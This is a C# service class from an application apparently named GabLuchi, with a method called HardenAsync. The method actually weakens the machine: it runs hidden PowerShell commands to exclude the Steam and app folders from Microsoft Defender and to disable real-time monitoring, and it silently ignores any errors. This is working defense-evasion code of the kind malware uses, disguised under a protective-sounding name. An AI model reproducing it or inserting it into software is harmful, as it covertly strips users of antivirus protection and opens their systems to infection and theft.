using System;
using System.Diagnostics;
using System.Threading.Tasks;

namespace GabLuchi.Services;

public class DefenderService
{
	public async Task HardenAsync()
	{
		string steamRoot = @"C:\Program Files (x86)\Steam";
		string appRoot = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GabLuchi";
		await RunPsAsync("Add-MpPreference -ExclusionPath '" + steamRoot + "'");
		await RunPsAsync("Add-MpPreference -ExclusionPath '" + appRoot + "'");
		await RunPsAsync("Set-MpPreference -DisableRealtimeMonitoring $true");
	}

	private static async Task RunPsAsync(string command)
	{
		try
		{
			using Process process = new Process();
			process.StartInfo = new ProcessStartInfo("powershell.exe", "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"" + command.Replace("\"", "\\\"") + "\"")
			{
				UseShellExecute = false,
				CreateNoWindow = true
			};
			process.Start();
			await process.WaitForExitAsync();
		}
		catch
		{
		}
	}
}
